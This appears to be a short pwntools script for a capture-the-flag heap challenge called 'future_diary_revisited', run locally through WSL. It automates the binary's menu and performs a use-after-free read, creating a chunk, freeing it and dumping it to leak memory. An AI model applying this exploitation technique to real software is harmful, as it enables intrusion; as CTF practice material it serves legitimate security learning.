from pwn import *
import os
import shlex
import subprocess


context.log_level = "debug"


def start():
    wsl_path = subprocess.check_output(
        ["wsl", "wslpath", "-a", os.getcwd()]
    ).decode().strip()
    return process([
        "wsl",
        "bash",
        "-lc",
        f"cd {shlex.quote(wsl_path)}/extracted && ./future_diary_revisited",
    ])


def create(io, idx, size, data):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"page? ", str(idx).encode())
    io.sendlineafter(b"length? ", str(size).encode())
    io.sendafter(b"content? ", data)
    if len(data) < size:
        io.send(b"\n")


def delete(io, idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"page? ", str(idx).encode())


def dump(io, idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"page? ", str(idx).encode())
    return io.recvline(keepends=False)


io = start()
create(io, 1, 0x78, b"A")
delete(io, 1)
leak = dump(io, 1)
print("leak", leak, leak.hex())
io.sendlineafter(b"> ", b"4")
print(io.recvall(timeout=1))
